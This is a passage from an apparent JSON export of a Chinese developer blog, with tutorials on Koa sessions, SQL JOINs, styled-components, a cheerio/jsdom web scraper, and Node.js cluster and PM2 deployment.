ctx.render('index-home', &#123; sid: ctx.cookies.get('sid') &#125;); &#125;) .get('/home', async ctx =&gt; &#123; await ctx.render('index-home', &#123; sid: ctx.cookies.get('sid') &#125;); &#125;) .post('/login', async ctx =&gt; &#123; if (!ctx.cookies.get('sid')) &#123; // 第一次登录 const data = ctx.request.body; // 创建 session, const sid = await ctx.session.create(data.user); // 设置 cookies ctx.cookies.set('sid', sid); console.log(sid); return ctx.redirect('/home'); &#125; ctx.redirect('/'); &#125;) .get('/logoff', async ctx =&gt; &#123; await ctx.session.delete(ctx.cookies.get('sid')); ctx.cookies.set('sid', undefined); ctx.redirect('/'); &#125;) ;app .use(require('koa-logger')()) .use(require('koa-static-cache')(path.join(__dirname, './public'))) .use(require('koa-body')()) .use(require('./session')()) .use(auth()) .use(router.routes()) .use(router.allowedMethods())app.listen(3000, () =&gt; &#123; console.log('\\n\\trun server in 3000.');&#125;); 上面的代码做的几样事情： 先是搭建了一个 http 服务 编写了一个 auth 中间件，这个中间件的作用是用户认证功能，当存在 sid 且通过认证时，next 到下一个中间件。否则重定向到根路由（/） 用户在（/login）登录时，通过创建 session，设置 cookie 来维持会话管理 用户注销时，通过删除 session 与 cookie 来结束会话 一般的流程：登录 -&gt; 主页或其他页 -&gt; 注销或过期处理。 效果看起来是这样： 参考资料 https://github.com/koajs/session","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"}]},{"title":"图解 SQL JOIN","slug":"Mysql/图解 SQL JOIN","date":"2017-07-15T14:53:38.000Z","updated":"2021-06-15T06:10:52.830Z","comments":true,"path":"/stories/2017/07/Mysql/图解 SQL JOIN/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/Mysql/图解 SQL JOIN/","excerpt":"前言由于 SQL Join 似乎被默认为基础，同时利用文氏图表来解释它，乍一看似乎是很自然的选择。我喜欢这个概念，不过让我们先来看看这是否会在实际中发挥作用。假设我们有以下的两个表格，表 A 在左边，表 B 在右边，我们将它们填充每个四条记录。","text":"前言由于 SQL Join 似乎被默认为基础，同时利用文氏图表来解释它，乍一看似乎是很自然的选择。我喜欢这个概念，不过让我们先来看看这是否会在实际中发挥作用。假设我们有以下的两个表格，表 A 在左边，表 B 在右边，我们将它们填充每个四条记录。 下面是，初始化 SQL 语句： 123456789101112131415161718192021Create Table tablea( id int Primary Key, name varchar(20)) default charset=utf8;Create Table tableb( id int Primary Key, name varchar(20)) default charset=utf8;Insert Into test.tablea(id, name) Values (1, 'Pirate'), (2, 'Monkey'), (3, 'Ninja'), (4, 'Spaghetti');Insert Into test.tableb(id, name) Values (1, 'Rutabaga'), (2, 'Pirate'), (3, 'Darth Vader'), (4, 'Ninja'); 他们看起来就像这样： 123456id name id name-- ---- -- ----1 Pirate 1 Rutabaga2 Monkey 2 Pirate3 Ninja 3 Darth Vader4 Spaghetti 4 Ninja Inner join（内连接）通过 name 字段以几个不同的方式连接这些表，看看是否会得到一个概念上匹配那些漂亮的维恩图。 123456789Select * From tablea Inner Join tableb On tablea.name = tableb.name-- 结果id name id name-- ---- -- ----1 Pirate 2 Pirate3 Ninja 4 Ninja Inner join 产生的结果集中，是 A 和 B 的交集。 Full outer join（全外连接）1234567891011Select * From tablea Full Outer Join tableb On tablea.name = tableb.name-- 结果id name id name-- ---- -- ----1 Pirate 2 Pirate2 Monkey null null3 Ninja 4 Ninja4 Spaghetti null null Full outer join 产生 A 和 B 的并集。但是需要注意的是，对于没有匹配的记录，则会以 null 做为值。 123456789101112Select * From tablea Full Outer Join tableb On tablea.name = tableb.name Where tablea.id Is Null Or tableb.id Is Null-- 结果id name id name-- ---- -- ----2 Monkey null null4 Spaghetti null nullnull null 1 Rutabaganull null 3 Darth Vader 要生成的记录集独特的表A和表B，我们执行相同的 full outer join ，然后通过一个 where 子句排除我们不从双方想要的记录。 Left outer join（左外连接）1234567891011Select * From tablea Left Outer Join tableb On tablea.name = tableb.name-- 结果id name id name-- ---- -- ----1 Pirate 2 Pirate2 Monkey null null3 Ninja 4 Ninja4 Spaghetti null null Left outer join 产生表 A 的完全集，而表 B 中匹配的则有值，没有匹配的则以 null 值取代。 12345678910Select * From tablea Left Outer Join tableb On tablea.name = tableb.name Where tableb.id Is Null-- 结果id name id name-- ---- -- ----2 Monkey null null4 Spaghetti null null 为了产生一套只在表 A 记录，而不是在表 B 中，我们执行相同的 Left outer join ，然后通过一个 where 子句排除我们不想要的右侧记录。（如果改成Is Not Null则变成 A 与 B 的交集，也就是Inner Json的结果） Cross Join（交差集）还需要注册的是我们还有一个是“交差集” cross join, 这种 Join 没有办法用文式图表示，因为其就是把表 A 和表 B 的数据进行一个 N * M 的组合，即笛卡尔积。表达式如下： 12Select * From TableACross Join TableB 这个笛卡尔乘积会产生 4 x 4 = 16 条记录，一般来说，我们很少用到这个语法。但是我们得小心，如果不是使用嵌套的select语句，一般系统都会产生笛卡尔乘积然再做过滤。这是对于性能来说是非常危险的，尤其是表很大的时候。 参考资料 http://blog.codinghorror.com/a-visual-explanation-of-sql-joins/","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"💅 Styled-Components 最佳使用方式","slug":"React/Style/Styled-Components 最佳使用方式","date":"2017-07-13T01:41:20.000Z","updated":"2021-06-15T06:10:52.885Z","comments":true,"path":"/stories/2017/07/React/Style/Styled-Components 最佳使用方式/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/React/Style/Styled-Components 最佳使用方式/","excerpt":"前言现在基本都是使用 Sass 来编写 React 组件的样式。使用的结构是类名作用域控制的方式，比如有一个 model 组件。那么就使用 .model-component 类名来作为作用域。这时需要一个 div 最为容器，并写上作用域类名。 123&lt;div className=\"model-component\"&gt; &lt;p className=\"title\"&gt;&lt;/p&gt;&lt;/div&gt; 同理，如果是布局组件、视图组件，那么对应的类名作用域是 model-layout，model-view。 但是这样有几个问题： 类名可能会出现过长的情况，组件内样式需要写嵌套类结构，Sass 编译后的 CSS 文件可能会大一点。 每个组件都需要携带一个 .scss 文件，这样有点繁琐，随着项目的增大会有一大堆文件。 为了解决这些问题，将使用 styled-components 来管理组件的样式。styled-components 不但能在 React 里使用，同时也适用于 React Native。","text":"前言现在基本都是使用 Sass 来编写 React 组件的样式。使用的结构是类名作用域控制的方式，比如有一个 model 组件。那么就使用 .model-component 类名来作为作用域。这时需要一个 div 最为容器，并写上作用域类名。 123&lt;div className=\"model-component\"&gt; &lt;p className=\"title\"&gt;&lt;/p&gt;&lt;/div&gt; 同理，如果是布局组件、视图组件，那么对应的类名作用域是 model-layout，model-view。 但是这样有几个问题： 类名可能会出现过长的情况，组件内样式需要写嵌套类结构，Sass 编译后的 CSS 文件可能会大一点。 每个组件都需要携带一个 .scss 文件，这样有点繁琐，随着项目的增大会有一大堆文件。 为了解决这些问题，将使用 styled-components 来管理组件的样式。styled-components 不但能在 React 里使用，同时也适用于 React Native。 styled-componentsStyled-Components是由 Max Stoiber 和 Glen Maddern 创建的一种新的 CSS 工具，可帮助您在React项目中组织 CSS，它也适用于React Native。 首先，我们来谈谈 Styles-Components 的主要用途，以及从使用中会获得什么的优势/好处？ 摆脱样式和组件之间的映射：大多数情况下，愚蠢的组件总是有自己的小 style.css 文件相关。因此，每次要创建愚蠢的组件时都需要创建两个文件。这似乎在一开始就很好，但是当你的项目越来越大，你会得到一大堆文件。Styled-Components 允许直接在组件中编写 CSS，从而完全解决了这个问题。 构建小型和可重复使用的组件：小型组件易于重新使用和测试。通过使用 Styled-Components，您可以轻松构建一个小组件并扩展其功能 props。 降低特异性冲突的风险：每个人都可能遇到特异性冲突问题。例如，您只是想为特定段落添加 margin，但会无意中影响其他段落。您可以通过仅应用一次 CSS 类来轻松解决此问题。Styled-Components 实际上会这样做，它会自动生成一个唯一的类名，并将其传递给我们的组件。 安装： 1npm install --save styled-components vscode 高亮插件：vscode-styled-components 基本使用在使用 Styled-Components 时，如果想为基本的 HTML 元素添加样式，就有使用styled.h1这种方式。也可以通过styled(&#39;h1&#39;)这种方式，这只是别名的区别。 123456789101112131415161718192021import styled, &#123; css &#125; from 'styled-components';// 创建一个 title 组件，它渲染至 h1const Title = styled.h1` font-size: 1.5em; text-align: center; color: palevioletred;`;const Wrapper = styled.section` padding: 4em; background: papayawhip;`;render( &lt;Wrapper&gt; &lt;Title&gt; Hello World &lt;/Title&gt; &lt;/Wrapper&gt;); Styled-Components 会自动生成一个唯一的类名，并将其传递给我们的组件。最后会输出类似的&lt;h1 class=&quot;4fKfRK&quot;&gt;Hello World&lt;/h1&gt;这些样式是在开发模式时动态生成的，而在生产模式时，会打包到一个 css 文件里。 使用 props可以从组件里接收 props 来动态的生成样式。它接收一个回调函数，返回新的样式值。 12345678910111213141516const Button = styled.button` background: $&#123;props =&gt; props.primary ? 'palevioletred' : 'white'&#125;; color: $&#123;props =&gt; props.primary ? 'white' : 'palevioletred'&#125;; $&#123;props =&gt; props.size &amp;&amp; 'font-size: 1em;'&#125; margin: 1em; padding: 0.25em 1em; border: 2px solid palevioletred; border-radius: 3px;`;render( &lt;div&gt; &lt;Button&gt;Normal&lt;/Button&gt; &lt;Button primary&gt;Primary&lt;/Button&gt; &lt;/div&gt;); 自定义扩展Styled-Components 除了使用基本的 HTML 元素外，还可以自定义的扩展。比如说：想使用，styled.mylink，而 mylink 是指定的元素。 1234567891011121314151617181920// 自己定义的组件元素const Link = (&#123; className, children &#125;) =&gt; ( &lt;a className=&#123;className&#125;&gt; &#123;children&#125; &lt;/a&gt;);// 类似的 styled.divconst StyledLink = styled(Link)` color: palevioletred; font-weight: bold;`;render( &lt;div&gt; &lt;Link&gt;Unstyled, boring Link&lt;/Link&gt; &lt;br /&gt; &lt;StyledLink&gt;Styled, exciting Link&lt;/StyledLink&gt; &lt;/div&gt;); 样式继承（extends）Styled-Components 提供了样式继承的方式，让组件尽量可复用。 123456789101112131415// 基础组件样式const Button = styled.button` color: palevioletred; font-size: 1em; margin: 1em; padding: 0.25em 1em; border: 2px solid palevioletred; border-radius: 3px;`;// 继承的样式，相同的属性会被覆盖const TomatoButton = Button.extend` color: tomato; border-color: tomato;`; 混合（mixin）提供类似 mixin 的玩法。 12345678910111213141516import styled, &#123; css &#125; from 'styled-components';const complexMixin = css` color: $&#123;props =&gt; props.whiteColor ? 'red': 'blue'&#125;`;const StyledComp = styled.div` $&#123;complexMixin&#125;`;render( &lt;div&gt; &lt;StyledComp whiteColor=&#123;true&#125;&gt;&lt;/StyledComp&gt; &lt;StyledComp whiteColor=&#123;false&#125;&gt;&lt;/StyledComp&gt; &lt;/div&gt;); 属性（attrs）可以为基本的元素/自定义组件，添加额外的 props，或者设置默认的 props，它使用起来就像下面的。 1234567891011121314151617181920212223242526// 设置默认的 attrconst Input = styled.input.attrs(&#123; // 默认属性 type type: 'password', // 默认的 margin, padding margin: props =&gt; props.size || '1em', padding: props =&gt; props.size || '1em'&#125;)` color: palevioletred; font-size: 1em; border: 2px solid palevioletred; border-radius: 3px; /* here we use the dynamically computed props */ margin: $&#123;props =&gt; props.margin&#125;; padding: $&#123;props =&gt; props.padding&#125;;`;render( &lt;div&gt; &lt;Input placeholder=\"A small text input\" /&gt; &lt;br /&gt; &lt;Input placeholder=\"A bigger text input\" size=\"2em\" /&gt; &lt;/div&gt;); 动画（Animations）CSS3 的关键帧是全局的，为了做到局限于单个组件，关键帧助手会为你生成一个唯一的名称，然后你可以在你的应用程序中使用这个唯一的名字。 123456789101112131415161718192021import styled, &#123; css, keyframes &#125; from 'styled-components';// 定义了一个关键帧，类似 @keyframes rotate360 &#123; from: &#123;&#125; to&#123;&#125; &#125;const rotate360 = keyframes` from &#123; transform: rotate(0deg); &#125; to &#123; transform: rotate(360deg); &#125;`;// 如果在两个文件里定义相同的 rotate360 变量。这样时没关系的。它会使用内部的唯一 id。// 使用关键帧const Rotate = styled.div` display: inline-block; animation: $&#123;rotate360&#125; 2s linear infinite; padding: 2rem 1rem; font-size: 1.2rem;`;render( &lt;Rotate&gt;💅&lt;/Rotate&gt;); 主题（Theming）Styled-Components 支持主题的功能，类似实现夜间模式的主题切换功能。 如果使用了 ThemeProvider，那么其子组件就会被注入 theme 属性，它就像 Redux 的 Provider 一样通过 Context 来获取上下文数据。 1234567891011121314151617181920212223242526272829303132333435// 定义主题名称const theme = &#123; primary: '#3af', // 蓝色 size: '16px',&#125;;const Button = styled.button` font-size: $&#123;props =&gt; props.theme.size&#125;; margin: 1em; padding: 0.25em 1em; border-radius: 3px; background-color: #fff; /* Color the border and text with theme.main */ color: $&#123;props =&gt; props.theme.primary&#125;; border: 2px solid $&#123;props =&gt; props.theme.primary&#125;;`;// 如果被 ThemeProvider 包裹，则使用 ThemeProvider 的属性，否则使用默认的Button.defaultProps = &#123; theme: &#123; primary: '#f34' // 红色 size: '15px' &#125;&#125;;render( &lt;div&gt; &lt;Button&gt;红色&lt;/Button&gt; &lt;ThemeProvider theme=&#123;theme&#125;&gt; &lt;Button&gt;蓝色&lt;/Button&gt; &lt;/ThemeProvider&gt; &lt;/div&gt;); 通常我们需要在 Sass 里定义一些全局变量，来方便定义主题颜色。而 ThemeProvider 就像是 Sass 中定义的全局变量一样，只要被它包裹的组件都可以从 props.theme 获取数据。 theme 对象不仅仅可以是字符串，也可以是函数。 比如定义一个媒体查询函数。 12345678export default &#123; media: (content, width = 480, min = false) =&gt; ` @media screen and ($&#123;min ? 'min' : 'max'&#125;-width: $&#123;width&#125;px) &#123; $&#123;content&#125; &#125; `, color: 'rgba(69, 200, 62, 1)', // 主题颜色&#125; 使用的时候： 123$&#123;p =&gt; p.theme.media(` margin-top: 0;`, 720)&#125; 引用（refs）如果你想获取组件的引用，那就不能使用 refs，而是使用innerRef来代替。因为 React 规定：key、ref 等属性只能设置，不能从 this.props 里获取。 1234567891011121314151617const Input = styled.input` padding: 0.5em; margin: 0.5em; color: palevioletred; background: papayawhip; border: none; border-radius: 3px;`;const Form = () =&gt; ( &lt;Input placeholder=\"Hover here...\" // 不可以使用 innerRef='aaa' 字符串的形式，只能用回调 innerRef=&#123;x =&gt; this.input = x&#125; onMouseEnter=&#123;() =&gt; this.input.focus()&#125; /&gt;); 媒体查询（Media）媒体查询是不可缺少的工具，在开发 Web 应用程序的里一般用来做响应开发。 下面的例子，一旦屏幕宽度小于 700px 它就会改变颜色。实际上你会发现，它支持嵌套写法。 12345678910111213const Content = styled.div` background: papayawhip; height: 3em; width: 3em; @media (max-width: 700px) &#123; background: palevioletred; &#125;`;render( &lt;Content /&gt;); 媒体查询可以长期和反复运用在一个应用程序里，我们可以为它创建一个通用的模板。由于 JavaScript 的功能性质，你可以很容易地定义自己的通用媒体查询模版，就像下面的例子一样。 12345678910111213141516171819202122232425262728293031import styled, &#123; css &#125; from 'styled-components';const sizes = &#123; desktop: 992, tablet: 768, phone: 376&#125;;&lt;!--const media = Object.keys(sizes).reduce((acc, label) =&gt; &#123; acc[label] = (...args) =&gt; css` @media (max-width: $&#123;sizes[label] / 16&#125;em) &#123; $&#123;css(...args)&#125; &#125; ` return acc;&#125;, &#123;&#125;);--&gt;const Content = styled.div` height: 3em; width: 3em; background: papayawhip; $&#123;media.desktop`background: dodgerblue;`&#125; $&#123;media.tablet`background: mediumseagreen;`&#125; $&#123;media.phone`background: palevioletred;`&#125;`;render( &lt;Content /&gt;); 全局样式（injectGlobal）使用 injectGlobal 可以把样式注入到全局下，而不是单一的组件下。 1234567import styled, &#123; css, injectGlobal &#125; from 'styled-components';injectGlobal` body &#123; padding: 20px; &#125;`; 支持的 CSSStyled-Components 支持所有 CSS，包括嵌套，内联，类似 Less/Sass 的用法（注释只能使用 /* */）。这不就是专门为取代 Less/Sass 而准备的吗？ styled-components 对 CSS 的支持是基于 stylis 这个库的。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455const theme-color = '#fff';const Example = styled.div` padding: 2em 1em; /* 变量 */ color: $&#123;theme-color&#125;; /* 与 less/sass 一样的嵌套 */ &amp;:hover &#123; background: palevioletred; &#125; /* 伪类 */ &amp;::after &#123; content: ''; display: tabel; clear: both; &#125; /* 媒体查询 */ @media (max-width: 600px) &#123; background: tomato; /* 媒体查询里也能使用 &amp; */ &amp;:hover &#123; background: yellow; &#125; &#125; /* 后代选择器 */ &gt; p &#123; text-decoration: underline; &#125; /* 上下文选择器 */ html.test &amp; &#123; display: none; &#125; /* 动画 */ animation: start 2s ease-in-out infinite alternate; animation-fill-mode: both; @keyframes start &#123; 0% &#123; background-color: #3af; &#125; 100% &#123; background-color: #3c5; &#125; &#125;`;render( &lt;Example&gt; &lt;p&gt;Hello World!&lt;/p&gt; &lt;/Example&gt;); React Native 中使用Styled-Components 也可以在 React Native 里使用，如果要使用，引入native即可。 123456789101112131415161718192021222324import React, &#123; Component &#125; from 'react';import styled from 'styled-components/native';import &#123; View, Text,&#125; from 'react-native';const StyledView = styled.View` background-color: papayawhip;`;const StyledText = styled.Text` color: palevioletred;`;class MyReactNativeComponent extends Component &#123; render() &#123; return ( &lt;StyledView&gt; &lt;StyledText&gt;Hello World!&lt;/StyledText&gt; &lt;/StyledView&gt; ); &#125;&#125; 一些差异性是在 react-native style 里不支持的属性，写上去将会得到一个警告，并且没有效果。并且，部分的写法有变化。下面 text-shadow-offset 不像 react-native 里的写法，峰驼式变成了连号式。单位需要带上，而且不支持 injectGlobal，以及 CSS 嵌套的写法。 123456const RotatedBox = styled.View` transform: rotate(90deg); text-shadow-offset: 10px 5px; font-variant: small-caps; margin: 5px 7px 2px;`; 服务端渲染styled-components 支持 React 服务端渲染。像 React 一样，在服务端渲染里需要使用特定个的 api，使用的 api 是 ServerStyleSheet。 1234567891011121314151617181920212223import React from 'react';import &#123; renderToString &#125; from 'react-dom/server';import &#123; ServerStyleSheet &#125; from 'styled-components';const sheet = new ServerStyleSheet();const body = renderToString(sheet.collectStyles(&lt;App /&gt;));const styleTags = sheet.getStyleTags(); // &lt;style&gt;const html = `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; $&#123;styleTags&#125;&lt;/head&gt;&lt;body&gt; &lt;div&gt; $&#123;body&#125; &lt;/div&gt; &lt;script src=\"/static/build.da782dadjF.js\" /&gt;&lt;/body&gt;&lt;/html&gt;`; 或者在组件外面包一层： 12345678import &#123; StyleSheetManager &#125; from 'styled-components'// 只改 body，其他不变const body = renderToString( &lt;StyleSheetManager sheet=&#123;sheet.instance&#125;&gt; &lt;App /&gt; &lt;/StyleSheetManager&gt;); 参考资料 https://www.styled-components.com/","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"基于 Nodejs，Cheerio 的爬虫","slug":"抓包&爬虫/基于 Nodejs 的爬虫","date":"2017-07-11T01:27:39.000Z","updated":"2021-06-15T06:10:52.917Z","comments":true,"path":"/stories/2017/07/抓包&爬虫/基于 Nodejs 的爬虫/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/抓包&爬虫/基于 Nodejs 的爬虫/","excerpt":"Cheerio在 Nodejs 里有个叫 cheerio 的模块，它的最小型的 JQuery 的实现，能够轻松的解析抓取到的 DOM 数据。","text":"Cheerio在 Nodejs 里有个叫 cheerio 的模块，它的最小型的 JQuery 的实现，能够轻松的解析抓取到的 DOM 数据。 这里就简单的说明一下使用： 使用 JQuery 获取 DOM 节点123456789// 获取全部图片$('img');// 获取全部链接$('a');// 对图片 src 进行筛选，选择 .jpg 结尾的图片$('img[src $= .jpg]');// 对链接 href 进行筛选，选择 https 开头的链接$('a[href ^= https]'); 使用 Cheerio 解析 DOM 节点123456789const cheerio = require('cheerio');// $html 是爬到的 htmllet $ = cheerio.load($html);// 获取全部图片，返回一个数组集合$('img[src $= .jpg]');// ... 后面的基本一致 如果你会 JQuery，完全可以零学习的使用 Cheerio，Cheeio 兼容了 JQuery DOM 操作的 API。关于 Cheerio 的使用，参考： https://cheerio.js.org/ Nodejs 抓取 html使用 Nodejs 抓取 html，用到了 http 模块。第三方superagent模块，对此进行了进一步封装使它的 API 变得更加友好。不过我使用的是简单易懂的fetch。 抓取-多玩图库·美女图片1234567891011// 抓取-多玩图库·美女图片fetch('http://tu.duowan.com/m/meinv') .then(res =&gt; res.text()) // 解析 html .then(html =&gt; cheerio.load(html)) // 提取 image .then($ =&gt; $('a &gt; img[src *= M00]').toArray().map(img =&gt; img.attribs)) // 下载 image .then(imgList =&gt; downloadImg('./public/download/image', imgList)) // 错误 处理 .catch(err =&gt; console.log('Error:', JSON.stringify(err, null, 4))); 结果 动态数据如果，某个页面的数据是通过动态数据（Javascript）生成的，比如勾拉网的招聘列表。那么，我比较建议的使用JSDOM，因为它提供的 DOM 的容器模拟浏览器来运行 Javascript。JSDOM 与 Cheerio 不同，Cheerio 是解析 DOM，而 JSDOM 是运行 DOM。 jsdomjsdom 是许多 Web 标准的纯 JavaScript 实现，特别是与 Node.js 一起使用的 WHATWG DOM 和 HTML 标准。一般而言，该项目的目标是模拟足够的一部分网页浏览器，用于测试和刮刮真实世界的 Web 应用程序。（jsdom 的最新版本需要 Node.js v6+ 或更新版本） 安装： 1npm install --save jsdom@latest 简单的使用下面是最简单的使用方式：（请注意，JSDOM 的构造函数的参数数据不应该包括&lt;html&gt;，&lt;head&gt;，&lt;body&gt;标签） 12345const jsdom = require(\"jsdom\");const &#123; JSDOM &#125; = jsdom;// 解析，运行 domconst dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);console.log(dom.window.document.querySelector(\"p\").textContent); // \"Hello world\" 生成的对象是 JSDOM 类的一个实例，其中包含许多有用的属性和方法 window。 还可以运行目标页面： 12345678910const fetch = require('node-fetch');const jsdom = require(\"jsdom\");const &#123; JSDOM &#125; = jsdom;async function get() &#123; const html = await fetch('http://127.0.0.1:3000').then(res =&gt; res.text()); // 解析，运行 dom const dom = new JSDOM(html); // ... some think&#125; 更多的参考 JSDOM API。 小结除了 Cheerio，JSDOM，另外还有 node-crawler，phantomjs，puppeteer 这些库都很值得尝试哦。还可以使用 async 来控制并发队列数量，让爬虫爬得更稳。 参考资料 https://github.com/cheeriojs/cheerio https://github.com/tmpvar/jsdom","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"Nodejs 多核 CPU 分布式集群","slug":"Nodejs/Nodejs 多核 CPU 分布式集群","date":"2017-07-08T13:48:27.000Z","updated":"2021-06-15T06:10:52.839Z","comments":true,"path":"/stories/2017/07/Nodejs/Nodejs 多核 CPU 分布式集群/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/Nodejs/Nodejs 多核 CPU 分布式集群/","excerpt":"集群Nodejs运行在 Chrome 的 JavaScript 运行时平台上，我们把该平台优雅地称之为 V8 引擎。不论是 V8 引擎，还是之后的 Nodejs，都是以单线程的方式运行的，因此，在多核心处理器的系统中并不能发挥其最大的性能。 但是，在 Nodejs 推出了 cluster（集群）模块后，最大限度的利用多核 CPU 运行 Nodejs 成为了可能。","text":"集群Nodejs运行在 Chrome 的 JavaScript 运行时平台上，我们把该平台优雅地称之为 V8 引擎。不论是 V8 引擎，还是之后的 Nodejs，都是以单线程的方式运行的，因此，在多核心处理器的系统中并不能发挥其最大的性能。 但是，在 Nodejs 推出了 cluster（集群）模块后，最大限度的利用多核 CPU 运行 Nodejs 成为了可能。 Cluster 模块Nodejs给我们提供了 cluster 模块，它可以生成多个工作线程来共享同一个 TCP 连接。 下面的一个简单 Cluster 代码： 12345678910111213141516171819202122232425262728const cluster = require('cluster');const http = require('http');const numCPUs = require('os').cpus().length;// 当该进程是主进程时，返回 Trueif (cluster.isMaster) &#123; console.log(`主进程 pid:$&#123;process.pid&#125; 正在运行`); // 衍生工作进程，根据 CPU 个数 for (let i = 0; i &lt; numCPUs; i++) &#123; cluster.fork(); &#125; cluster.on('exit', (worker, code, signal) =&gt; &#123; console.log(`工作进程 pid:$&#123;worker.process.pid&#125; 已退出`); &#125;);&#125;else &#123; // 工作进程可以共享任何 TCP 连接。 // 在本例子中，共享的是一个 HTTP 服务器。 http.createServer((req, res) =&gt; &#123; res.writeHead(200); res.end('你好世界\\n'); &#125;).listen(8000); console.log(`server run in 127.0.0.1:8000`); console.log(`工作进程 pid:$&#123;process.pid&#125; 已启动`);&#125; 运行起来，那么工作进程就会共享8000端口： 12345678$ node server.jsserver run in 127.0.0.1:8000主进程 pid:3596 正在运行工作进程 pid:4324 已启动工作进程 pid:4520 已启动工作进程 pid:5644 已启动工作进程 pid:6056 已启动 当然，你可以指定任意数量的工作线程，线程的数量不仅限于 CPU 核心的数量，因为它只是作为一个运行在 CPU 上的子线程。 正如你所看到的，要使其正常运行，你需要将你的代码封装到 cluster 的处理逻辑中，并添加一些额外的代码来指定当一个线程挂掉之后如何进行处理。 它是如何运作的呢？ 首先，Cluster会创建一个master，然后根据你指定的数量复制出多个 server app （也被称之为工作线程）。它通过IPC通道与主线程之间进行通信，并使用内置的负载均衡来更好地处理线程之间的压力，该负载均衡使用了Round-robin算法（也被称之为循环算法）。 什么是 Round Robin？ 轮询调度（Round Robin Scheduling）算法就是以轮询的方式依次将请求调度不同的服务器，即每次调度执行 i = (i + 1) mod n，并选出第i台服务器。算法的优点是其简洁性，它无需记录当前所有连接的状态，所以它是一种无状态调度。轮询调度算法假设所有服务器处理性能均相同，不管服务器的当前连接数和响应速度。该算法相对简单，不适用于服务器组中处理性能不一的情况，而且当请求服务时间变化比较大时，轮询调度算法容易导致服务器间的负载不平衡。所以此种均衡算法适合于服务器组中的所有服务器都有相同的软硬件配置并且平均服务请求相对均衡的情况。 当使用Round-robin调度策略时，master accepts() 所有传入的连接请求，然后将相应的TCP请求处理发送给选中的工作线程（该方式仍然通过IPC来进行通信）。 比如说，当前有 10000 个请求，master 可能会平均分配给每个工作线程去处理，它们对应处理 2500 个请求，而每个工作线程是运行在不同的 CPU（多核 CPU）上的，这样处理性能会大大提升。 使用 PM2PM2 并不是雾霾的意思，而是一个非常优秀的 Nodejs 的进程管理器，下图，是 PM2 支持的功能。 使用 PM2 躺着实现负载均衡PM2 内置了 cluster 的处理逻辑，所以我们可以使用 PM2 来配置 Nodejs 集群。 下面是 Koa2 的一个 http 服务： 123456789101112const Koa = require('koa');const Router = require('koa-router');const app = new Koa();const router = new Router();router.get('/', async ctx =&gt; &#123; ctx.body = 'hello world!';&#125;);app.use(router.routes());app.listen(3000); 然后使用 PM2 命令来启动集群服务： 1pm2 start app.js -i 4 也可以通过 js/json 配置文件来启动： 1234567&#123; \"apps\" : [&#123; \"script\" : \"api.js\", \"instances\" : 0, \"exec_mode\" : \"cluster\" &#125;]&#125; 然后启动配置文件： 1pm2 start config.json 其中：-i &lt;number of workers&gt;参数用来告诉 PM2 以cluster_mode的形式运行 app.js，后面的数字表示要启动的工作线程的数量。如果给定的数字为 0，PM2 则会根据你 CPU 核心的数量来生成对应的工作线程。 保持运行无论如何，PM2 都会尽可能保持你的 app.js 运行。如果任意一个工作线程挂掉了，不用担心，PM2 会立即将其重启。当然，你也完全可以在任何时候手动重启这些线程（pm2 restart all）。 实时扩展集群任何时候，如果你需要增加工作线程的数量，可以通过pm2 scale &lt;app name&gt; &lt;n&gt;来对集群进行扩展。参数&lt;n&gt;指定工作线程的数量，被用来增加或减少集群数。你也可以通过pm2 scale app +3的方式来指定要增加多少工作线程。 在产品环境实现零停机更新PM2 的reload &lt;app name&gt;功能将依次重启所有的工作线程。每一个线程会等待在新的线程创建之后才会被终止掉，因此，当你在产品环境部署新的代码时，server 会不间断地一直保持运行。使用gracefulReload功能可以达到相同的目的，不同的是它不会立即终止工作线程，而是通过 IPC 发送一个 shutdown 信号来关闭所有当前的连接并处理一些自定义的任务，然后再优雅地退出。如下面的代码： 12345678process.on('message', function(msg) &#123; if (msg === 'shutdown') &#123; close_all_connections(); delete_cache(); server.close(); process.exit(0); &#125;&#125;); 使用配置文件使用配置文件能够更好的配置 PM2，而不应该是使用一堆的命令。 下面的 Javascript 的配置文件，只需要导入一个配置对象即可。推荐使用这种方式，因为还可以注释，使用 json 就不可以注释。 注意：使用 Javascript 配置文件需要结束文件名.config.js 123456789101112131415161718module.exports = &#123; apps : [&#123; name : \"worker\", // 应用名称 script : \"./worker.js\", // 入口文件 watch : true, env: &#123; \"NODE_ENV\": \"development\", // 开发模式 &#125;, env_production : &#123; \"NODE_ENV\": \"production\" // 生成模式 &#125; &#125;,&#123; name : \"api-app\", script : \"./api.js\", instances : 4, // 4 个工作线程 exec_mode : \"cluster\" // 使用集群模式 &#125;]&#125; 也可以使用 json，基本和 Javascript 